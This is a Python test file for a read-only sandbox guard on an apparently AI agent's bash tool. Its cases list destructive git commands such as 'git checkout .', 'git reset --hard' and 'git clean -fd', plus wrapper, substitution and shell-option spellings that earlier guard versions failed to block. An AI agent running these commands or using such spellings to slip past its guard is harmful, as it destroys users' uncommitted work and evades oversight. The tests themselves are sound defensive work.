def test_check_read_only_has_no_subcommand_but_write_for_stash():
    """`git stash` alone mutates (saves + cleans the tree); listing verbs don't.

    `git remote -v` / `git worktree` / `git submodule` with no subcommand only
    print help or a listing; a bare `git stash` is a real mutator. The old
    regex could not tell these apart because it matched tokens, not verbs.
    """
    for cmd in ("git stash", "git -C . stash", "git -c x=1 stash"):
        allowed, _, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} must be blocked (bare stash mutates)"
    for cmd in ("git remote -v", "git remote", "git worktree", "git submodule"):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must stay allowed (got {reason!r})"

def test_find_git_mutator_terminates_on_self_reference():
    """Nesting is bounded: a payload that rewrites its own wrapper cannot
    recurse forever (the guard caps depth rather than trusting the input)."""
    from emrg.tools.bash_tool import _find_git_mutator

    assert _find_git_mutator("sh -c \"sh -c 'sh -c \\\"echo hi\\\"'\"") is None

def test_git_checkout_index_is_blocked_like_checkout():
    """The regression that motivated fail-closed, in its real spellings.

    `git checkout-index -f -a` / `-u -a` / `-a -f` overwrite uncommitted work —
    the same damage as `git checkout .`, which the guard already blocks. These
    were blocked on master *by accident* (substring match) and allowed by the
    parsed-verb classifier, which is a strict data-loss regression: a command
    that used to be refused became runnable. Measured end-to-end, all three
    destroyed a dirty working tree.
    """
    for cmd in (
        "git checkout-index -f -a",
        "git checkout-index -a -f",
        "git checkout-index --all",
        "git checkout-index -f --all",
        "git checkout-index -u -a",
        "git checkout-index --index --force --all",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} overwrites uncommitted work; must block"

def test_git_classification_is_fail_closed_over_every_subcommand():
    """The guard must decide by *effect*, so it must not depend on a list of
    names someone remembered.

    Measured: `git help -a` reports 169 subcommands. The previous design kept a
    blocklist of mutating verbs and allowed everything else, which left 129 of
    the 169 allowed — `git checkout-index -f -a`, which overwrites uncommitted
    work exactly like `git checkout`, among them. It was blocked on master only
    by accident: a raw-text regex matched `checkout` as a *substring* of
    `checkout-index`. Parsing the verb correctly removed the accident and made
    the hole visible, which is the honest reason this test exists.

    So this test does not list "the verbs we thought of". It takes git's own
    subcommand list and asserts the *complement* property: every subcommand
    that is not a declared read is blocked. A blocklist cannot satisfy this —
    adding the next missing verb would leave the test red on the verb after it.
    """
    allowlist = _GIT_READ_VERBS
    shape_decided = _GIT_SHAPE_DECIDED
    # Verbs git reports that are not declared reads and are not shape-decided
    # must block, whether or not anyone remembered them.
    unlisted = {
        "checkout-index", "mktree", "mktag", "filter-branch", "replace",
        "update-server-info", "pack-refs", "reflog", "symbolic-ref",
        "update-ref", "read-tree", "sparse-checkout", "notes", "init",
        "clone", "revert", "cherry-pick", "rebase", "switch", "restore",
        "unpack-objects", "index-pack", "pack-objects", "fast-import",
        "fast-export", "update-index", "write-tree", "commit-tree",
    }
    for verb in sorted(unlisted):
        assert verb not in allowlist, f"{verb!r} must not be a declared read"
        allowed, reason, _ = _check_sandbox(f"git {verb}", "read-only")
        assert allowed is False, f"unlisted git verb {verb!r} must block by default"
    assert shape_decided  # the shape-decided table must stay populated

def test_git_merge_file_family_is_blocked():
    """`merge-file` / `merge-index` / `merge-one-file` write files in place.

    These were in the same accidental-coverage gap as `checkout-index`: the old
    raw-text scan matched `merge` as a substring, so a parsed-verb classifier
    that only listed `merge` silently allowed them.
    """
    for cmd in (
        "git merge-file a b c",
        "git merge-index x",
        "git merge-one-file a b c",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes the working tree; must block"

def test_git_reads_stay_allowed_under_fail_closed():
    """The safe default must not buy safety with false blocks on real work.

    An allowlist is only usable if its listed reads actually pass; the ones
    below are the inspections an evolution cycle runs constantly, plus the
    listing forms with a pattern argument (`git tag -l 'v*'`), where the flag
    and not the absence of an argument is what makes the command a read.
    """
    for cmd in (
        "git status --porcelain", "git log --oneline -3", "git diff --stat",
        "git diff --cached", "git show HEAD --stat", "git rev-parse HEAD",
        "git merge-base HEAD master", "git merge-tree a b", "git ls-files",
        "git cat-file -p HEAD", "git grep foo", "git for-each-ref",
        "git submodule status", "git worktree list", "git stash list",
        "git stash show -p", "git remote -v", "git config -l",
        "git config --get user.name", "git branch -a", "git branch",
        "git tag -l", "git tag -l 'v*'", "git tag", "git remote get-url origin",
        "git fetch origin master", "git hash-object a.txt", "git version",
        "git help add", "git check-ignore a.txt",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

def test_git_shape_decided_verbs_block_their_writing_forms():
    """Flag/subcommand-decided verbs default to block, not to allow.

    Fail-closed is only meaningful if the ambiguous verbs err the same way: a
    shape that is not a proven read must block. `git branch newbr` creates,
    `git tag v9` creates, `git hash-object -w` writes the object database.
    """
    for cmd in (
        "git branch newbr", "git branch -D old", "git tag v9", "git tag -d v1",
        "git hash-object -w a.txt", "git stash", "git stash drop",
        "git stash pop", "git stash clear", "git worktree add ../wt",
        "git worktree remove ../wt", "git worktree prune",
        "git submodule update --init", "git remote add origin x",
        "git remote set-url origin x", "git config core.x y",
        "git config user.name someone",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} writes; must block ({reason!r})"

def test_git_verb_parsing_ignores_quoted_mentions():
    """A mutator inside a string literal is not a command (issue #1156 facet D).

    The old scan refused a command that merely *contained* the phrase, which
    made the guard's own regression tests unwritable from a read-only cycle.
    Parsing keeps the mention as one token, so the text is data, not an
    invocation.
    """
    for cmd in (
        'echo "git merge origin/master"',
        'printf %s "git reset --hard"',
        "echo 'git clean -fd'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} must be allowed (got {reason!r})"


def test_command_substitution_is_not_a_polite_spelling():
    """`` `git checkout .` `` runs git; master blocked it and this parser did not.

    `shlex`'s default punctuation set is `();<>|&` — it omits the backtick — so a
    command substitution stayed glued to its words: `` `git checkout .` ``
    tokenised as `` ['`git', 'checkout', '.`'] `` and the program word never
    matched `git`. Measured against master 2026-09-12 (`cyc20260912-190602`):
    master's raw-text guard blocked all four shapes below and the parsed guard
    allowed all four — an under-block in the destructive direction, introduced by
    the same migration that fixed the over-blocks. `$( … )` was never affected
    because its `git` is already a separate token, which is exactly why the hole
    survived the substitution cases that were covered.

    The fix is structural (the tokenizer splits on the backtick) rather than a
    strip in the name comparison, so it covers the wrapping shapes below and not
    only the one where the substitution wraps the whole program word.
    """
    for cmd in (
        "`git checkout .`",
        "echo `git checkout .`",
        "x=`git checkout .`",
        "`git reset --hard`",
        "y=`git stash`",
        "$(git checkout .)",
        "echo $(git checkout .)",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} runs git and must be blocked"

    # The complement: a substitution that only *reads* stays allowed, so the fix
    # is not "block anything with a backtick".
    for cmd in (
        "`git status`",
        "echo `git log --oneline -3`",
        "echo $(git status)",
        "echo $(git rev-parse HEAD)",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"


def test_an_unquoted_git_argument_is_data_not_an_invocation():
    """`grep -rn git .` searches for the word git; it does not run git.

    The quoted-mention test above covers a string literal, which tokenising
    keeps whole. The **unquoted** argument is the same defect one level down:
    the parser saw the token `git` and resolved the *following* token as its
    verb, so `grep -rn git .` became the invocation `git .` — and the fail-closed
    default then refused an ordinary search. Measured against master 2026-09-12
    (`cyc20260912-190602`): 9 of 30 read shapes regressed this way, all of them
    a command that merely *names* git as an argument.

    Guarded in both directions on purpose. The cheap fix — "only the first
    token can be an invocation" — fixes these and silently allows
    `env git checkout .`, trading a false block for data loss.
    """
    for cmd in (
        "grep -rn git .",
        "grep -rn git src/",
        "grep -n git README.md",
        "grep -rn git --include=*.py .",
        "grep -r git .",
        "echo git checkout .",
        "printf %s git checkout .",
        "find . -name git",
        "man git",
        "which git",
        "ls -la git",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} names git as data and must be allowed ({reason!r})"


def test_a_command_wrapper_still_makes_its_argument_an_invocation():
    """The complement: a prefixed git really runs, so it must still block.

    `env git checkout .` and `sudo git checkout .` are not position 0, and
    `sudo -u root git checkout .` / `timeout 5 git checkout .` / `nice -n 5 git
    checkout .` / `xargs -I{} git checkout .` / `stdbuf -o0 git checkout .` put a
    flag *and its value* between the wrapper and the command — which is why the
    position model skips a flag's value rather than only the flag. Measured: the
    first version of the model, skipping flags alone, allowed 5 of these 44
    mutator shapes (cyc20260912-190602).
    """
    for cmd in (
        "env git checkout .",
        "env FOO=1 git checkout .",
        "sudo git checkout .",
        "sudo -u root git checkout .",
        "doas git checkout .",
        "xargs git checkout .",
        "xargs -I{} git checkout .",
        "nohup git checkout .",
        "time git checkout .",
        "timeout 5 git checkout .",
        "nice -n 5 git checkout .",
        "command git checkout .",
        "stdbuf -o0 git checkout .",
        "setsid git checkout .",
        "FOO=1 git checkout .",
        "true && git checkout .",
        "false || git checkout .",
        "echo hi ; git checkout .",
        "cat f | git checkout .",
        "$(git checkout .)",
        "(git checkout .)",
        "! git checkout .",
        "sh -c \"sh -c 'git checkout .'\"",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is False, f"{cmd!r} runs git and must be blocked"


def test_shell_wrapper_options_do_not_block_a_read():
    """The over-approximation must not refuse a wrapper that only reads.

    Recursing into every token after a wrapper cannot miss a payload; the
    price is that `bash script.sh` recurses into a *filename*. That parses to
    no git invocation, so it stays allowed — and it must, or the fix for the
    option gap would buy safety with a false block on ordinary work.
    """
    for cmd in (
        "bash --login -c 'git status'",
        "bash --login -c 'git log --oneline -3'",
        "sh -c 'echo hi'",
        "bash script.sh",
        "zsh -o errexit -c 'git diff --stat'",
    ):
        allowed, reason, _ = _check_sandbox(cmd, "read-only")
        assert allowed is True, f"{cmd!r} is a read and must be allowed ({reason!r})"

def test_shell_wrapper_options_do_not_hide_the_payload():
    """No option spelling before `-c` may stop the payload being recursed into.

    The first version of this guard located the `-c` flag by walking forward
    and `break`ing on the first token that was not a short flag. That looks
    tighter than recursing blindly, but it makes correctness depend on
    *enumerating every way a flag can be spelled* — and the enumeration is
    always incomplete. Measured 2026-09-12: short spellings (`-c`, `-lc`,
    `-x -c`) were blocked, while a long option (`--login`) or an option that
    takes a value (`-o pipefail`) ended the walk early, so 9 of 14 wrapper
    shapes were ALLOWED under read-only. Driven end to end through
    `BashTool.execute`, 3 of those 4 destroyed a file with uncommitted
    changes that master blocks.

    This is the #461 class: matching one spelling of a class while another
    spelling passes. So the cases below are grouped by option *class* — short
    combined, long, and option-with-value — because the lesson is about the
    class, not about the individual spellings that happened to be found.
    """
    # One entry per option class; each must still block the payload.
    option_classes = {
        "short": ["-c", "-lc", "-x -c", "-eu -c"],
        "long": ["--login -c", "--noprofile -c", "--norc -c", "--posix -c"],
        "option-with-value": ["-o pipefail -c", "-o errexit -c"],
        "combined long+short": ["--login -l -c"],
    }
    for cls, spellings in option_classes.items():
        for opt in spellings:
            cmd = f"bash {opt} 'git checkout .'"
            allowed, reason, _ = _check_sandbox(cmd, "read-only")
            assert allowed is False, f"[{cls}] {cmd!r} must be blocked"
    # A different wrapper binary takes the same options.
    for cmd in ("zsh --login -c 'git checkout .'", "sh -o errexit -c 'git stash'"):
        assert _check_sandbox(cmd, "read-only")[0] is False, cmd
